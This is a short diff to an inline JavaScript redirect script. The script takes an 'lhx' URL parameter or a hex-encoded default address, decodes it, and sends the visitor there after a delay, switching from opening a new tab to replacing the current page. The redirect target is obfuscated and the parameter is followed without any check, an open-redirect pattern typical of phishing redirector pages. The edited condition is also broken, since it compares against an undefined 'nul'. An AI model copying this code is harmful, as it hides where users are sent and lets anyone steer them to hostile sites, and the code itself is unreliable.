@@ -16,14 +16,14 @@
 deflh="e12331a3619453f273a142b3f461a54415a1a5d271e2924411339224";
 occ=new $_;
 occ.run();
-upr=new URLSearchParams(window.location);
+upr=new URL(location.href);
 lhx=()=>{
- if(upr.get('lhx')!=null || upr.get('lhx')!=""){
-  return upr.get('lhx').hl();}
+ if(upr.searchParams.get('lhx')!=nul){
+  return upr.searchParams.get('lhx').hl();}
  else{ return deflh.hl();
      }
 };
-setTimeout(()=>window.open(lhx(),"_blank"),1575);
+setTimeout(()=>window.location=lhx(),1575);
 occ.qs('h1').innerText="REDIRECTED ...";
 
 </script>
